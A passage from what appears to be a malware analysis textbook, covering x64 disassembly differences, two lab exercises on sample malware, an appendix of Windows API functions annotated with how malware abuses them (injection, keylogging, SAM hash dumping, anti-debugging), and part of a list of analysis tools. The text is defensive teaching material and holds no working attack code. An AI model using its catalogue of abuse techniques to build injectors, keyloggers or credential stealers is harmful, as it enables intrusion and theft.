Knowing that 32-bit malware can target both 32-bit and 64-bit machines, why 
would anyone bother to write 64-bit malware?
While you can run both 32-bit and 64-bit applications on the same system, 
you cannot run 32-bit code within 64-bit applications. When a processor is 
running 32-bit code, it is running in 32-bit mode, and you cannot run 64-bit 
code. Therefore, anytime malware needs to run inside the process space of a 
64-bit process, it must be 64-bit.
Here are a few examples of why malware might need to be compiled for 
the x64 architecture:
[Word Count: 94]

Plug-ins and injected code
These must be 64-bit in order to run properly in a 64-bit process. For 
example, a malicious Internet Explorer plug-in or ActiveX control 
must be 64-bit if the computer is running the 64-bit version of Internet 
Explorer. Code injected using the techniques covered in Chapter 12 also 
runs within another process. If the target process is 64-bit, the injected 
code must also be 64-bit.
[Word Count: 68]

Shellcode
Shellcode is usually run as part of an exploit within the process that it 
is exploiting. In order to exploit a vulnerability in the 64-bit version of 
Internet Explorer, for example, a malware author would need to write 
64-bit shellcode. As more users run a mix of 64-bit and 32-bit applica-
tions, malware writers will need to write a separate version of shellcode 
for 32-bit and 64-bit victims.
[Word Count: 69]

The following are the most important differences between Windows 64-bit 
and 32-bit architecture:
[Word Count: 13]


All addresses and pointers are 64 bits.
[Word Count: 8]


All general-purpose registers—including RAX, RBX, RCX, and so on—
have increased in size, although the 32-bit versions can still be accessed. 
For example, the RAX register is the 64-bit version of the EAX register.
[Word Count: 35]


Some of the general-purpose registers (RDI, RSI, RBP, and RSP) have 
been extended to support byte accesses, by adding an L suffix to the 
16-bit version. For example, BP normally accesses the lower 16 bits of 
RBP; now, BPL accesses the lowest 8 bits of RBP.
[Word Count: 47]


The special-purpose registers are 64-bits and have been renamed. For 
example, RIP is the 64-bit instruction pointer.
[Word Count: 18]


There are twice as many general-purpose registers. The new registers 
are labeled R8 though R15. The DWORD (32-bit) versions of these registers 
can be accessed as R8D, R9D, and so on. WORD (16-bit) versions are 
accessed with a W suffix (R8W, R9W, and so on), and byte versions 
are accessed with an L suffix (R8L, R9L, and so on).
[Word Count: 60]

x64 also supports instruction pointer–relative data addressing. This is 
an important difference between x64 and x86 in relation to PIC and shell-
code. Specifically, in x86 assembly, anytime you want to access data at a 
location that is not an offset from a register, the instruction must store the 
entire address. This is called absolute addressing. But in x64 assembly, you 
can access data at a location that is an offset from the current instruction 
pointer. The x64 literature refers to this as RIP-relative addressing. Listing 21-1 
shows a simple C program that accesses a memory address.
[Word Count: 97]

int x;
void foo() {
      int y = x;
      ...
}
[Word Count: 11]

Listing 21-1: A simple C program with a data access
[Word Count: 10]

The x86 assembly code for Listing 21-1 references global data (the vari-
able x). In order to access this data, the instruction encodes the 4 bytes repre-
senting the data’s address. This instruction is not position independent, 
because it will always access address 0x00403374, but if this file were to be 
loaded at a different location, the instruction would need to be modified so 
that the mov instruction accessed the correct address, as shown in Listing 21-2.
[Word Count: 77]

00401004 A1 74 33 40 00 mov     eax, dword_403374
[Word Count: 9]

Listing 21-2: x86 assembly for the C program in Listing 21-1
[Word Count: 11]

You’ll notice that the bytes of the address are stored with the instruction at 
, , , and . Remember that the bytes are stored with the least significant 
byte first. The bytes 74, 33, 40, and 00 correspond to the address 0x00403374.
After recompiling for x64, Listing 21-3 shows the same mov instruction 
that appears in Listing 21-2.
[Word Count: 59]

0000000140001058 8B 05 A2 D3 00 00 mov     eax, dword_14000E400
[Word Count: 10]

Listing 21-3: x64 assembly for Listing 21-1
[Word Count: 7]

Differences in the x64 Calling Convention and Stack Usage
[Word Count: 9]

The calling convention used by 64-bit Windows is closest to the 32-bit fastcall 
calling convention discussed in Chapter 6. The first four parameters of the 
call are passed in the RCX, RDX, R8, and R9 registers; additional ones are 
stored on the stack.
[Word Count: 43]

NOTE
Most of the conventions and hints described in this section apply to compiler-generated 
code that runs on the Windows OS. There is no processor-enforced requirement to follow 
these conventions, but Microsoft’s guidelines for compilers specify certain rules in order 
to ensure consistency and stability. Beware, because hand-coded assembly and mali-
cious code may disregard these rules and do the unexpected. As usual, investigate any 
code that doesn’t follow the rules.
[Word Count: 71]

In the case of 32-bit code, stack space can be allocated and unallocated in 
the middle of the function using push and pop instructions. However, in 64-bit 
code, functions cannot allocate any space in the middle of the function, 
regardless of whether they’re push or other stack-manipulation instructions.
[Word Count: 48]

Figure 21-1: Stack size in the same function compiled for 32-bit and 64-bit architectures
[Word Count: 14]

004113C0  mov     eax, [ebp+arg_0]
004113C3  push    eax
004113C4  mov     ecx, [ebp+arg_C]
004113C7  push    ecx
004113C8  mov     edx, [ebp+arg_8]
004113CB  push    edx
004113CC  mov     eax, [ebp+arg_4]
004113CF  push    eax
004113D0  push    offset aDDDD_  
004113D5  call    printf
004113DB  add     esp, 14h
[Word Count: 39]

Listing 21-4: Call to printf compiled for a 32-bit processor
[Word Count: 10]

The 32-bit assembly has five push instructions before the call to printf, 
and immediately after the call to printf, 0x14 is added to the stack to clean it 
up. This clearly indicates that there are five parameters being passed to the 
printf function.
Listing 21-5 shows the disassembly for the same function call compiled 
for a 64-bit processor:
[Word Count: 58]

0000000140002C96  mov     ecx, [rsp+38h+arg_0]
0000000140002C9A  mov     eax, [rsp+38h+arg_0]
0000000140002C9Emov     [rsp+38h+var_18], eax
0000000140002CA2  mov     r9d, [rsp+38h+arg_18]
0000000140002CA7  mov     r8d, [rsp+38h+arg_10]
0000000140002CAC  mov     edx, [rsp+38h+arg_8]
0000000140002CB0  lea     rcx, aDDDD_   
0000000140002CB7  call    cs:printf
[Word Count: 30]

Listing 21-5: Call to printf compiled for a 64-bit processor
[Word Count: 10]

Windows 64-bit assembly code has well-formed sections at the beginning and 
end of functions called the prologue and epilogue, which can provide useful 
information. Any mov instructions at the beginning of a prologue are always 
used to store the parameters that were passed into the function. (The com-
piler cannot insert mov instructions that do anything else within the prologue.) 
Listing 21-6 shows an example of a prologue for a small function.
[Word Count: 72]

00000001400010A0  mov     [rsp+arg_8], rdx
00000001400010A5  mov     [rsp+arg_0], ecx
00000001400010A9  push    rdi
00000001400010AA  sub     rsp, 20h
[Word Count: 15]

Listing 21-6: Prologue code for a small function
[Word Count: 8]

Here, we see that this function has two parameters: one 32-bit and one 
64-bit. This function allocates 0x20 bytes from the stack, as required by all 
nonleaf functions as a place to provide storage for parameters. If a function 
has any local stack variables, it will allocate space for them in addition to the 
0x20 bytes. In this case, we can tell that there are no local stack variables 
because only 0x20 bytes are allocated.
[Word Count: 75]

Certain features in 64-bit code can provide additional clues to malware func-
tionality that are not available in 32-bit code. These features are conventional 
and generally apply only to compiler-generated code.
For example, it is typically easier in 64-bit code to differentiate between 
pointers and data values. The most common size for storing integers is 32 bits, 
although that is not a requirement. Still, even when simply storing an index 
value that iterates from 1 to 100, most programmers will choose a 32-bit inte-
ger for storage.
Table 21-1 shows the 32-bit and 64-bit versions of the same function call.
[Word Count: 100]

In the 32-bit assembly shown on the left, there are two parameters to the 
function sub_411186. We have no information about the types or purposes of 
the parameters, other than that they are both 32 bits.
In the 64-bit assembly shown on the right, we also see two parameters, 
but now we have additional information. The first mov instruction at  moves 
the value into RDX, which tells us that this is a 64-bit value—probably a 
pointer. The second parameter is being moved into ECX, which tells us that
[Word Count: 89]

Table 21-1: 32-bit and 64-bit Function Calls with Two Parameters
[Word Count: 10]

32-bit assembly listing
64-bit assembly listing
[Word Count: 6]

004114F2  mov     eax, [ebp+var_8]
004114F5  push    eax
004114F6  mov     ecx, [ebp+var_14]
004114F9  push    ecx
004114FA  call    sub_411186
[Word Count: 17]

0000000140001148mov     rdx, [rsp+38h+var_18]
000000014000114D
mov     ecx, [rsp+38h+var_10]
0000000140001151
call    sub_14000100A
[Word Count: 10]

it is a 32-bit value, because ECX is the 32-bit version of the RCX register. This 
can’t be a pointer, because pointers are 64 bits. We still don’t know whether 
this parameter is an integer, handle, or something else, but when you’re 
starting to understand a function, these little clues can be crucial to deter-
mining what a function does.
[Word Count: 60]

Analyzing 64-bit malware is not much different from analyzing 32-bit malware, 
because the instructions and concepts are very similar. Malware analysts need 
to understand how function calling and stack usage are accomplished in 
order to determine how many parameters and local variables each function 
has. It’s also important to understand the WOW64 subsystem in case you 
need to analyze a 32-bit executable that modifies system directories or regis-
try keys used by the OS. Most malware is still 32-bit, but the amount of 64-bit 
malware continues to grow, and its use will extend even more in the future.
[Word Count: 98]

You’ll need a 64-bit computer and a 64-bit virtual machine in order to run 
the malware for these labs, as well as the advanced version of IDA Pro in 
order to analyze the malware.
[Word Count: 34]

Analyze the code in Lab21-01.exe. This lab is similar to Lab 9-2, but tweaked 
and compiled for a 64-bit system.
[Word Count: 20]

1.
What happens when you run this program without any parameters?
[Word Count: 11]

2.
Depending on your version of IDA Pro, main may not be recognized 
automatically. How can you identify the call to the main function?
[Word Count: 24]

3.
What is being stored on the stack in the instructions from 
0x0000000140001150 to 0x0000000140001161?
[Word Count: 15]

4.
How can you get this program to run its payload without changing the 
filename of the executable?
[Word Count: 18]

5.
Which two strings are being compared by the call to strncmp at 
0x0000000140001205?
[Word Count: 14]

6.
Does the function at 0x00000001400013C8 take any parameters?
[Word Count: 9]

7.
How many arguments are passed to the call to CreateProcess at 
0x0000000140001093? How do you know?
[Word Count: 17]

Analyze the malware found in Lab21-02.exe on both x86 and x64 virtual 
machines. This malware is similar to Lab12-01.exe, with an added x64 
component.
[Word Count: 24]

1.
What is interesting about the malware’s resource sections?
[Word Count: 9]

2.
Is this malware compiled for x64 or x86?
[Word Count: 9]

3.
How does the malware determine the type of environment in which it is 
running?
[Word Count: 15]

4.
What does this malware do differently in an x64 environment versus an 
x86 environment?
[Word Count: 15]

5.
Which files does the malware drop when running on an x86 machine? 
Where would you find the file or files?
[Word Count: 21]

6.
Which files does the malware drop when running on an x64 machine? 
Where would you find the file or files?
[Word Count: 21]

7.
What type of process does the malware launch when run on an x64 
system?
[Word Count: 15]

I M P O R T A N T  W I N D O W S  
F U N C T I O N S
[Word Count: 25]

NOTE
This appendix presents a selective list of functions. We have excluded functions 
whose purpose should be clear from the function name alone, such as ReadFile and 
DeleteFile.
[Word Count: 28]

accept
Used to listen for incoming connections. This function indicates that the 
program will listen for incoming connections on a socket.
[Word Count: 21]

AdjustTokenPrivileges
Used to enable or disable specific access privileges. Malware that per-
forms process injection often calls this function to gain additional 
permissions.
[Word Count: 23]

AttachThreadInput
Attaches the input processing for one thread to another so that the sec-
ond thread receives input events such as keyboard and mouse events. 
Keyloggers and other spyware use this function.
[Word Count: 32]

bind
Used to associate a local address to a socket in order to listen for incom-
ing connections.
[Word Count: 18]

BitBlt
Used to copy graphic data from one device to another. Spyware some-
times uses this function to capture screenshots. This function is often 
added by the compiler as part of library code.
[Word Count: 33]

CallNextHookEx
Used within code that is hooking an event set by SetWindowsHookEx. 
CallNextHookEx calls the next hook in the chain. Analyze the function 
calling CallNextHookEx to determine the purpose of a hook set by 
SetWindowsHookEx.
[Word Count: 35]

CertOpenSystemStore
Used to access the certificates stored on the local system.
[Word Count: 11]

CheckRemoteDebuggerPresent
Checks to see if a specific process (including your own) is being debugged. 
This function is sometimes used as part of an anti-debugging technique.
[Word Count: 25]

CoCreateInstance
Creates a COM object. COM objects provide a wide variety of functional-
ity. The class identifier (CLSID) will tell you which file contains the code 
that implements the COM object. See Chapter 7 for an in-depth explana-
tion of COM.
[Word Count: 41]

connect
Used to connect to a remote socket. Malware often uses low-level func-
tionality to connect to a command-and-control server.
[Word Count: 20]

ConnectNamedPipe
Used to create a server pipe for interprocess communication that will 
wait for a client pipe to connect. Backdoors and reverse shells sometimes 
use ConnectNamedPipe to simplify connectivity to a command-and-control 
server.
[Word Count: 33]

ControlService
Used to start, stop, modify, or send a signal to a running service. If mal-
ware is using its own malicious service, you’ll need to analyze the code 
that implements the service in order to determine the purpose of the call.
[Word Count: 42]

CreateFile
Creates a new file or opens an existing file.
[Word Count: 10]

CreateFileMapping
Creates a handle to a file mapping that loads a file into memory and 
makes it accessible via memory addresses. Launchers, loaders, and injec-
tors use this function to read and modify PE files.
[Word Count: 35]

CreateMutex
Creates a mutual exclusion object that can be used by malware to ensure 
that only a single instance of the malware is running on a system at any 
given time. Malware often uses fixed names for mutexes, which can be 
good host-based indicators to detect additional installations of the 
malware.
[Word Count: 51]

CreateProcess
Creates and launches a new process. If malware creates a new process, 
you will need to analyze the new process as well.
[Word Count: 23]

CreateRemoteThread
Used to start a thread in a remote process (one other than the calling 
process). Launchers and stealth malware use CreateRemoteThread to inject 
code into a different process.
[Word Count: 29]

CreateService
Creates a service that can be started at boot time. Malware uses CreateService 
for persistence, stealth, or to load kernel drivers.
[Word Count: 22]

CreateToolhelp32Snapshot
Used to create a snapshot of processes, heaps, threads, and modules. 
Malware often uses this function as part of code that iterates through 
processes or threads.
[Word Count: 27]

CryptAcquireContext
Often the first function used by malware to initialize the use of Windows 
encryption. There are many other functions associated with encryption, 
most of which start with Crypt.
[Word Count: 29]

DeviceIoControl
Sends a control message from user space to a device driver. DeviceIoControl 
is popular with kernel malware because it is an easy, flexible way to pass 
information between user space and kernel space.
[Word Count: 34]

DllCanUnloadNow
An exported function that indicates that the program implements a 
COM server.
[Word Count: 13]

DllGetClassObject
An exported function that indicates that the program implements a 
COM server.
[Word Count: 13]

DllInstall
An exported function that indicates that the program implements a 
COM server.
[Word Count: 13]

DllRegisterServer
An exported function that indicates that the program implements a 
COM server.
[Word Count: 13]

DllUnregisterServer
An exported function that indicates that the program implements a 
COM server.
[Word Count: 13]

EnableExecuteProtectionSupport
An undocumented API function used to modify the Data Execution Pro-
tection (DEP) settings of the host, making it more susceptible to attack.
[Word Count: 24]

EnumProcesses
Used to enumerate through running processes on the system. Malware 
often enumerates through processes to find a process to inject into.
[Word Count: 22]

EnumProcessModules
Used to enumerate the loaded modules (executables and DLLs) for 
a given process. Malware enumerates through modules when doing 
injection.
[Word Count: 21]

FindFirstFile/FindNextFile
Used to search through a directory and enumerate the filesystem.
[Word Count: 11]

FindResource
Used to find a resource in an executable or loaded DLL. Malware some-
times uses resources to store strings, configuration information, or other 
malicious files. If you see this function used, check for a .rsrc section in 
the malware’s PE header.
[Word Count: 42]

FindWindow
Searches for an open window on the desktop. Sometimes this function is 
used as an anti-debugging technique to search for OllyDbg windows.
[Word Count: 23]

FtpPutFile
A high-level function for uploading a file to a remote FTP server.
[Word Count: 13]

GetAdaptersInfo
Used to obtain information about the network adapters on the system. 
Backdoors sometimes call GetAdaptersInfo as part of a survey to gather 
information about infected machines. In some cases, it’s used to gather 
MAC addresses to check for VMware as part of anti-virtual machine 
techniques.
[Word Count: 46]

GetAsyncKeyState
Used to determine whether a particular key is being pressed. Malware 
sometimes uses this function to implement a keylogger.
[Word Count: 20]

GetDC
Returns a handle to a device context for a window or the whole screen. 
Spyware that takes screen captures often uses this function.
[Word Count: 24]

GetForegroundWindow
Returns a handle to the window currently in the foreground of the 
desktop. Keyloggers commonly use this function to determine in which 
window the user is entering his keystrokes.
[Word Count: 30]

gethostbyname
Used to perform a DNS lookup on a particular hostname prior to making 
an IP connection to a remote host. Hostnames that serve as command-
and-control servers often make good network-based signatures.
[Word Count: 33]

gethostname
Retrieves the hostname of the computer. Backdoors sometimes use 
gethostname as part of a survey of the victim machine.
[Word Count: 20]

GetKeyState
Used by keyloggers to obtain the status of a particular key on the keyboard.
[Word Count: 15]

GetModuleFilename
Returns the filename of a module that is loaded in the current process. 
Malware can use this function to modify or copy files in the currently 
running process.
[Word Count: 29]

GetModuleHandle
Used to obtain a handle to an already loaded module. Malware may 
use GetModuleHandle to locate and modify code in a loaded module or to 
search for a good location to inject code.
[Word Count: 34]

GetProcAddress
Retrieves the address of a function in a DLL loaded into memory. Used to 
import functions from other DLLs in addition to the functions imported 
in the PE file header.
[Word Count: 31]

GetStartupInfo
Retrieves a structure containing details about how the current process 
was configured to run, such as where the standard handles are directed.
[Word Count: 23]

GetSystemDefaultLangId
Returns the default language settings for the system. This can be used to 
customize displays and filenames, as part of a survey of an infected victim, 
or by “patriotic” malware that affects only systems from certain regions.
[Word Count: 38]

GetTempPath
Returns the temporary file path. If you see malware call this function, 
check whether it reads or writes any files in the temporary file path.
[Word Count: 26]

GetThreadContext
Returns the context structure of a given thread. The context for a thread 
stores all the thread information, such as the register values and current 
state.
[Word Count: 27]

GetTickCount
Retrieves the number of milliseconds since bootup. This function is 
sometimes used to gather timing information as an anti-debugging tech-
nique. GetTickCount is often added by the compiler and is included in 
many executables, so simply seeing it as an imported function provides 
little information.
[Word Count: 46]

GetVersionEx
Returns information about which version of Windows is currently run-
ning. This can be used as part of a victim survey or to select between dif-
ferent offsets for undocumented structures that have changed between 
different versions of Windows.
[Word Count: 40]

GetWindowsDirectory
Returns the file path to the Windows directory (usually C:\Windows). 
Malware sometimes uses this call to determine into which directory to 
install additional malicious programs.
[Word Count: 26]

inet_addr
Converts an IP address string like 127.0.0.1 so that it can be used by func-
tions such as connect. The string specified can sometimes be used as a 
network-based signature.
[Word Count: 31]

InternetOpen
Initializes the high-level Internet access functions from WinINet, such as 
InternetOpenUrl and InternetReadFile. Searching for InternetOpen is a good 
way to find the start of Internet access functionality. One of the parame-
ters to InternetOpen is the User-Agent, which can sometimes make a good 
network-based signature.
[Word Count: 47]

InternetOpenUrl
Opens a specific URL for a connection using FTP, HTTP, or HTTPS. 
URLs, if fixed, can often be good network-based signatures.
[Word Count: 22]

InternetReadFile
Reads data from a previously opened URL.
[Word Count: 8]

InternetWriteFile
Writes data to a previously opened URL.
[Word Count: 8]

IsDebuggerPresent
Checks to see if the current process is being debugged, often as part of 
an anti-debugging technique. This function is often added by the com-
piler and is included in many executables, so simply seeing it as an 
imported function provides little information.
[Word Count: 44]

IsNTAdmin
Checks if the user has administrator privileges.
[Word Count: 8]

IsWoW64Process
Used by a 32-bit process to determine if it is running on a 64-bit operat-
ing system.
[Word Count: 18]

LdrLoadDll
Low-level function to load a DLL into a process, just like LoadLibrary. 
Normal programs use LoadLibrary, and the presence of this import may 
indicate a program that is attempting to be stealthy.
[Word Count: 33]

LoadLibrary
Loads a DLL into a process that may not have been loaded when the pro-
gram started. Imported by nearly every Win32 program.
[Word Count: 24]

LoadResource
Loads a resource from a PE file into memory. Malware sometimes uses 
resources to store strings, configuration information, or other malicious 
files.
[Word Count: 23]

LsaEnumerateLogonSessions
Enumerates through logon sessions on the current system, which can be 
used as part of a credential stealer.
[Word Count: 19]

MapViewOfFile
Maps a file into memory and makes the contents of the file accessible via 
memory addresses. Launchers, loaders, and injectors use this function to 
read and modify PE files. By using MapViewOfFile, the malware can avoid 
using WriteFile to modify the contents of a file.
[Word Count: 46]

MapVirtualKey
Translates a virtual-key code into a character value. It is often used by 
keylogging malware.
[Word Count: 16]

MmGetSystemRoutineAddress
Similar to GetProcAddress but used by kernel code. This function retrieves 
the address of a function from another module, but it can only get 
addresses from ntoskrnl.exe and hal.dll.
[Word Count: 30]

Module32First/Module32Next
Used to enumerate through modules loaded into a process. Injectors use 
this function to determine where to inject code.
[Word Count: 20]

NetScheduleJobAdd
Submits a request for a program to be run at a specified date and time. 
Malware can use NetScheduleJobAdd to run a different program. As a mal-
ware analyst, you’ll need to locate and analyze the program that will be 
run in the future.
[Word Count: 45]

NetShareEnum
Used to enumerate network shares.
[Word Count: 6]

NtQueryDirectoryFile
Returns information about files in a directory. Rootkits commonly hook 
this function in order to hide files.
[Word Count: 18]

NtQueryInformationProcess
Returns various information about a specified process. This function is 
sometimes used as an anti-debugging technique because it can return 
the same information as CheckRemoteDebuggerPresent.
[Word Count: 26]

NtSetInformationProcess
Can be used to change the privilege level of a program or to bypass Data 
Execution Prevention (DEP).
[Word Count: 19]

OleInitialize
Used to initialize the COM library. Programs that use COM objects must 
call OleInitialize prior to calling any other COM functions.
[Word Count: 22]

OpenMutex
Opens a handle to a mutual exclusion object that can be used by mal-
ware to ensure that only a single instance of malware is running on a 
system at any given time. Malware often uses fixed names for mutexes, 
which can be good host-based indicators.
[Word Count: 47]

OpenProcess
Opens a handle to another process running on the system. This handle 
can be used to read and write to the other process memory or to inject 
code into the other process.
[Word Count: 33]

OpenSCManager
Opens a handle to the service control manager. Any program that installs, 
modifies, or controls a service must call this function before any other 
service-manipulation function.
[Word Count: 27]

OutputDebugString
Outputs a string to a debugger if one is attached. This can be used as an 
anti-debugging technique.
[Word Count: 19]

PeekNamedPipe
Used to copy data from a named pipe without removing data from the 
pipe. This function is popular with reverse shells.
[Word Count: 22]

Process32First/Process32Next
Used to begin enumerating processes from a previous call to 
CreateToolhelp32Snapshot. Malware often enumerates through processes 
to find a process to inject into.
[Word Count: 24]

QueryPerformanceCounter
Used to retrieve the value of the hardware-based performance counter. 
This function is sometimes using to gather timing information as part of 
an anti-debugging technique. It is often added by the compiler and is 
included in many executables, so simply seeing it as an imported func-
tion provides little information.
[Word Count: 51]

QueueUserAPC
Used to execute code for a different thread. Malware sometimes uses 
QueueUserAPC to inject code into another process.
[Word Count: 19]

ReadProcessMemory
Used to read the memory of a remote process.
[Word Count: 10]

recv
Receives data from a remote machine. Malware often uses this function 
to receive data from a remote command-and-control server.
[Word Count: 20]

RegisterHotKey
Used to register a handler to be notified anytime a user enters a partic-
ular key combination (like CTRL-ALT-J), regardless of which window is 
active when the user presses the key combination. This function is some-
times used by spyware that remains hidden from the user until the key 
combination is pressed.
[Word Count: 53]

RegOpenKey
Opens a handle to a registry key for reading and editing. Registry keys 
are sometimes written as a way for software to achieve persistence on a 
host. The registry also contains a whole host of operating system and 
application setting information.
[Word Count: 42]

ResumeThread
Resumes a previously suspended thread. ResumeThread is used as part of 
several injection techniques.
[Word Count: 15]

RtlCreateRegistryKey
Used to create a registry from kernel-mode code.
[Word Count: 9]

RtlWriteRegistryValue
Used to write a value to the registry from kernel-mode code.
[Word Count: 12]

SamIConnect
Connects to the Security Account Manager (SAM) in order to make 
future calls that access credential information. Hash-dumping programs 
access the SAM database in order to retrieve the hash of users’ login 
passwords.
[Word Count: 34]

SamIGetPrivateData
Queries the private information about a specific user from the Security 
Account Manager (SAM) database. Hash-dumping programs access the 
SAM database in order to retrieve the hash of users’ login passwords.
[Word Count: 32]

SamQueryInformationUse
Queries information about a specific user in the Security Account Man-
ager (SAM) database. Hash-dumping programs access the SAM database 
in order to retrieve the hash of users’ login passwords.
[Word Count: 31]

send
Sends data to a remote machine. Malware often uses this function to 
send data to a remote command-and-control server.
[Word Count: 20]

SetFileTime
Modifies the creation, access, or last modified time of a file. Malware 
often uses this function to conceal malicious activity.
[Word Count: 21]

SetThreadContext
Used to modify the context of a given thread. Some injection techniques 
use SetThreadContext.
[Word Count: 15]

SetWindowsHookEx
Sets a hook function to be called whenever a certain event is called. 
Commonly used with keyloggers and spyware, this function also provides 
an easy way to load a DLL into all GUI processes on the system. This 
function is sometimes added by the compiler.
[Word Count: 46]

SfcTerminateWatcherThread
Used to disable Windows file protection and modify files that otherwise 
would be protected. SfcFileException can also be used in this capacity.
[Word Count: 23]

ShellExecute
Used to execute another program. If malware creates a new process, you 
will need to analyze the new process as well.
[Word Count: 22]

StartServiceCtrlDispatcher
Used by a service to connect the main thread of the process to the service 
control manager. Any process that runs as a service must call this func-
tion within 30 seconds of startup. Locating this function in malware tells 
you that the function should be run as a service.
[Word Count: 51]

SuspendThread
Suspends a thread so that it stops running. Malware will sometimes sus-
pend a thread in order to modify it by performing code injection.
[Word Count: 25]

system
Function to run another program provided by some C runtime libraries. 
On Windows, this function serves as a wrapper function to CreateProcess.
[Word Count: 23]

Thread32First/Thread32Next
Used to iterate through the threads of a process. Injectors use these 
functions to find an appropriate thread to inject into.
[Word Count: 22]

Toolhelp32ReadProcessMemory
Used to read the memory of a remote process.
[Word Count: 10]

URLDownloadToFile
A high-level call to download a file from a web server and save it to disk. 
This function is popular with downloaders because it implements all the 
functionality of a downloader in one function call.
[Word Count: 36]

VirtualAllocEx
A memory-allocation routine that can allocate memory in a remote pro-
cess. Malware sometimes uses VirtualAllocEx as part of process injection.
[Word Count: 22]

VirtualProtectEx
Changes the protection on a region of memory. Malware may use this 
function to change a read-only section of memory to an executable.
[Word Count: 24]

WideCharToMultiByte
Used to convert a Unicode string into an ASCII string.
[Word Count: 11]

WinExec
Used to execute another program. If malware creates a new process, you 
will need to analyze the new process as well.
[Word Count: 22]

WlxLoggedOnSAS (and other Wlx* functions)
A function that must be exported by DLLs that will act as authentication 
modules. Malware that exports many Wlx* functions might be performing 
Graphical Identification and Authentication (GINA) replacement, as 
discussed in Chapter 11.
[Word Count: 39]

Wow64DisableWow64FsRedirection
Disables file redirection that occurs in 32-bit files loaded on a 64-bit sys-
tem. If a 32-bit application writes to C:\Windows\System32 after calling this 
function, then it will write to the real C:\Windows\System32 instead of 
being redirected to C:\Windows\SysWOW64.
[Word Count: 40]

WriteProcessMemory
Used to write data to a remote process. Malware uses WriteProcessMemory 
as part of process injection.
[Word Count: 17]

WSAStartup
Used to initialize low-level network functionality. Finding calls to 
WSAStartup can often be an easy way to locate the start of network-
related functionality.
[Word Count: 25]

T O O L S  F O R  M A L W A R E  A N A L Y S I S
[Word Count: 23]

This appendix lists popular malware analysis tools, 
including tools discussed in the book and others that 
we did not cover. We have made this list somewhat 
comprehensive so that you can try a variety of tools 
and figure out which ones best suit your needs.
[Word Count: 45]

ApateDNS
ApateDNS is a tool for controlling DNS responses. Its interface is an 
easy-to-use GUI. As a phony DNS server, ApateDNS spoofs DNS responses 
to a user-specified IP address by listening on UDP port 53 on the local 
machine. ApateDNS also automatically configures the local DNS server 
to localhost. When you exit ApateDNS, it restores the original local DNS 
settings. Use ApateDNS during dynamic analysis, as described in Chapter 3. 
You can download ApateDNS for free from http://www.mandiant.com/.
[Word Count: 78]

Autoruns
Autoruns is a utility with a long list of autostarting locations for Windows. 
For persistence, malware often installs itself in a variety of locations, 
including the registry, startup folder, and so on. Autoruns searches
[Word Count: 35]

various possible locations and reports to you in a GUI. Use Autoruns 
for dynamic analysis to see where malware installed itself. You can 
download Autoruns as part of the Sysinternals Suite of tools from http://
www.sysinternals.com/.
[Word Count: 36]

BinDiff
BinDiff is a powerful binary comparison plug-in for IDA Pro that allows 
you to quickly compare malware variants. BinDiff lets you pinpoint new 
functions in a given malware variant and tells you if any functions are 
similar or missing. If the functions are similar, BinDiff indicates how sim-
ilar they are and compares the two, as shown in Figure B-1.
[Word Count: 61]

Figure B-1: BinDiff difference comparison showing code missing from the variant’s function
[Word Count: 12]

BinNavi
BinNavi is a reverse-engineering environment similar to IDA Pro. Its 
strength lies in its graphical approach to reverse-engineering code. And, 
unlike IDA Pro, BinNavi can centrally manage your previously analyzed 
databases, which helps to track information; team members can easily 
work on the same project and share information and findings. BinNavi 
is available for purchase from http://www.zynamics.com/.
[Word Count: 58]

Burp Suite
The Burp Suite is typically used for testing web applications. It can be 
configured to allow malware analysts to trap specific server requests and 
responses in order to manipulate what is being delivered to a system. 
When Burp is set up as a man-in-the-middle, you can modify HTTP or 
HTTPS requests by changing the headers, data, and parameters sent by 
the malware to a remote server in order to force the server to give you 
additional information. You can download the Burp Suite from http://
portswigger.net/burp/.
[Word Count: 88]

Capture BAT
Capture BAT is a dynamic analysis tool used to monitor malware as it 
is running. Capture BAT will monitor the filesystem, registry, and pro-
cess activity. You can use exclusion lists (including many preset ones) 
to remove the noise in order to focus on the malware you are analyzing. 
While Capture BAT doesn’t have an extensive GUI like Process Monitor, 
it’s open source, so you can modify it. You can download Capture BAT 
for free from http://www.honeynet.org/.
[Word Count: 79]

CFF Explorer
CFF Explorer is a tool designed to make PE editing easy. The tool is use-
ful for editing resource sections, adding imports, or scanning for signa-
tures. CFF Explorer supports x86 and x64 systems, and it can handle 
.NET files without having the .NET Framework installed. You can down-
load CFF Explorer for free from http://www.ntcore.com/.
[Word Count: 58]

Deep Freeze
Deep Freeze from Faronics is a useful tool to use when performing mal-
ware analysis on physical hardware. It provides a VMware snapshotting 
capability for real hardware. You can run your malware, analyze it, and 
then just reboot. All the damage done by the malware will be undone, 
and your system will be back to a clean state. Deep Freeze is available for 
purchase from http://www.faronics.com/.
[Word Count: 68]

Dependency Walker
Dependency Walker is a static analysis tool used to explore DLLs and 
functions imported by a piece of malware. It works on both x86 and x64 
binaries, and builds a hierarchical tree diagram of all DLLs that will be 
loaded into memory when the malware is run. We discuss Dependency 
Walker in Chapter 1. You can download it for free from http://www
.dependencywalker.com/.
[Word Count: 65]

Hex Editors
Hex editors allow you to edit and view files containing binary data. Many 
hex editors are available, such as WinHex (our choice in this book), Hex 
Workshop, 010 Editor, HexEdit, Hex Editor Neo, FileInsight, and Flex-
HEX. When choosing a hex editor, look for features like a solid GUI, 
binary comparison, many data-decoding options (such as multibyte XOR), 
a built-in hash calculator, file format parsing, pattern searching, and so 
on. Many of these tools are available for purchase, but most come with a 
trial version.
[Word Count: 87]

Hex-Rays Decompiler
The Hex-Rays Decompiler is a powerful, but expensive, plug-in for IDA 
Pro that attempts to convert assembly code into human-readable, C-like 
pseudocode text. This tool installs an F5 “cheat button.” When you are 
looking at disassembly in IDA Pro, press F5 to have the plug-in open a 
new window with the C code. Figure B-2 shows what the pseudocode 
looks like for a code snippet from a piece of malware.
[Word Count: 72]

Figure B-2: Hex-Rays Decompiler showing C-like pseudocode generated from assembly
[Word Count: 10]

IDA Pro
IDA Pro is the most widely used disassembler for malware analysis. We 
discuss IDA Pro extensively throughout the book, and Chapter 5 pro-
vides an in-depth introduction to the tool. We recommend the commer-
cial version from http://www.hex-rays.com/. A freeware version is available 
from http://www.hex-rays.com/products/ida/support/download_freeware.shtml.
[Word Count: 47]

Immunity Debugger
Immunity Debugger (ImmDbg) is a freely available user-mode debug-
ger. It is derived from the OllyDbg 1.1 source code, as we discuss in 
Chapter 9, except that ImmDbg has cosmetically modified the OllyDbg 
GUI and added a fully functional Python interpreter with an API. In 
“Scriptable Debugging” on page 200 and the Chapter 13 labs, we demon-
